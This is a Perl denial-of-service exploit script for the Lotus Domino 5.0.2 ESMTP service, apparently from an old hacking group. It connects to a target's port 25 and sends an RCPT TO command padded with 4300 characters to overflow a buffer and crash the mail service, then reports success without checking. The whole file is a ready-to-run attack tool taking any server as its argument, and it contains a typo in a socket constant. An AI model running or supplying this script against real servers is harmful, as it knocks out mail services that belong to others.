#!/usr/bin/perl
##                                                               ##
##  Lotus Domino 5.0.2abc Denial of Service Xploit               ##
##  by Yo_Soy - <yo_soy@raza-mexicana.org>                       ##
##                                                               ##
##  The Lotus Domino ESMTP Service will crash when filling some  ##
##  SMTP commands with a buffer of 4069 chars long.              ##
##  The bug was found by Erik Damsgaard (www.vigilante.com)      ##
##                                                               ##
##  Usage: domino5.pl <domino_server>                            ##
##                                                               ##
##  USE THIS PROGRAM AT YOUR OWN RISK                            ##
##                                                               ##
##  (c) Raza Mexicana Team <-> [raza-mexicana@bigfoot.com]       ##
##  [-----------[http://www.raza-mexicana.org]-----------]       ##
##                                                               ##
###################################################################
##
use Socket;
print ("\n Lotus Domino 5.0.2abc Denial of Service Xploit\n");
print (" by Yo_Soy - <yo_soy\@raza-mexicana.org>\n\n");
die (" Usage: $0 <domino_server>\n") if !($ARGV[0]);
$iaddr = inet_aton($ARGV[0]) || die (" Unable to find host $ARGV[0]\n");
$paddr = sockaddr_in("25", $iaddr);
socket (SOCK, PF_INET, SOCK_STEAM, getprotobyname('tcp'));
connect (SOCK, $paddr) || die (" Unable to connect to $ARGV[0]:25\n");
print (" Connected. Sending overflow...\n");
send (SOCK, "HELO\r\n", 0); sleep(1);
send (SOCK, "MAIL FROM: <script\@kiddie.com>\r\n", 0); sleep(1);
send (SOCK, "RCPT TO: <" . "A" x 4300 . ">\r\n", 0); sleep(1);
close (SOCK);
print (" Overflow sent!, service crashed.\n");
